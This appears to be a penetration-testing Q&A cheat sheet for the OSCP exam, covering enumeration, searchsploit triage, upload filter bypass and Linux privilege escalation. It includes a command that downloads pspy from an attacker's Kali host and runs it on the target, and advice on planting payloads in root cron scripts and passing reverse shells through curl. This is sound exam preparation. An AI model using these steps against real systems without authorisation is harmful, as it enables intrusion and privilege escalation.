# When In Doubt — Common Questions & Answers

A reference for methodology questions that come up mid-box. Answers are OSCP-context only.

---

## Reconnaissance & Enumeration

**Q: The box name is "Image" and the app uses ImageMagick. Where do I start?**
The box name almost always hints at the attack surface. Don't overthink it:
- Box named "Image" + ImageMagick app = ImageMagick exploit
- Box named "Law" + htmLawed app = htmLawed exploit
- See the software → searchsploit it immediately
→ Save gobuster for background. Research the software first.

---

**Q: How do I find the version of software running on the target?**

| Method | How |
|---|---|
| Web app output | Upload a file / submit a form — the app may print it |
| HTTP response headers | Check in Burp or `curl -I http://<TARGET>` |
| nmap `-sV` | Already in your scan — read it carefully |
| searchsploit by version | Once you have it: `searchsploit <software> <version>` |
| After shell | `dpkg -l <package>`, `<binary> --version`, `apt-cache policy <package>` |

---

**Q: searchsploit gives me 8 results. How do I narrow it down?**

1. Filter by year — match the Ubuntu/OS version era:
   - Ubuntu 20.04 = released April 2020, focus on CVEs from 2020+
   - Ubuntu 18.04 = 2018+
2. Filter by platform:
```bash
searchsploit imagemagick | grep -i "ubuntu\|linux"
```
3. If you have the exact version:
```bash
searchsploit imagemagick 7.1
```
4. Check if the target package is patched:
```bash
dpkg -l <package>   # Debian revision tells you if a CVE was backport-patched
```
→ `dpkg -l policykit-1` showing `0.105-31+deb11u1` means patched. The Debian revision (after the last `-`) is authoritative, not the upstream version.

---

## File Upload

**Q: The app only accepts JPEG/PNG. I uploaded a .php file and got blocked. What now?**

First ask: is the file extension filter the vulnerability, or is the *software processing the file* the vulnerability?

- If the app runs the file through something (ImageMagick, ffmpeg, etc.) → exploit the processor, not the filter
- Name your malicious file `.jpg` — the filter sees the extension, not the contents
- `.htaccess` bypass is only relevant when you need PHP code to execute on the web server

---

## Privilege Escalation

**Q: I can't see a cron job running a writable script. How do I confirm root is running it?**
Use **pspy** — transfers from Kali, no install needed, shows every process with UID:
```bash
# On Kali
python3 -m http.server 80

# On target
cd /tmp && wget http://<KALI_IP>/pspy64 && chmod +x pspy64 && ./pspy64
```
Watch for `UID=0` running your target script.

---

**Q: pkexec is SUID. Is it automatically vulnerable?**
No. Check the Debian package version — upstream version lies:
```bash
pkexec --version          # shows upstream (unreliable)
dpkg -l policykit-1       # shows true patch status
```
CVE-2021-4034 (PwnKit) is patched if Debian revision is `0.105-26+deb11u1` or higher.

---

**Q: A writable file is owned by root but I don't see it in /etc/crontab. Is something running it?**
Root's personal crontab is at `/var/spool/cron/crontabs/root` — unreadable as www-data.
Confirm with pspy. If `UID=0` runs the script periodically, inject your payload and wait.

---

**Q: When do I go for a kernel exploit?**
Last resort only. Order of operations:
1. sudo -l
2. SUID binaries
3. Cron jobs / writable files
4. Credential hunting
5. Writable /etc/passwd
6. Capabilities (`getcap -r / 2>/dev/null`)
7. Kernel exploit — only after everything else fails

Kernel exploits are noisy, version-specific, and can crash the machine.

---

## Tools

**Q: What privesc tools should I transfer from Kali?**

| Tool | Purpose | Transfer |
|---|---|---|
| `pspy64` | Watch root processes without root | wget from Kali http.server |
| `linpeas.sh` | Automated privesc enumeration | wget from Kali http.server |
| `linux-exploit-suggester` | CVE suggestions from kernel version | wget from Kali http.server |

All three: serve from Kali with `python3 -m http.server 80`, wget to `/tmp` on target.

---

**Q: curl -d vs --data-urlencode — when does it matter?**
`-d` does not encode special characters. If your payload contains `&` or `=`, the shell treats them as parameter separators and breaks the POST body.
`--data-urlencode` encodes them safely.
→ Python reverse shell has no `&` characters. Bash shell does (`>&`, `0>&1`). Use Python when passing a shell through curl POST.

---
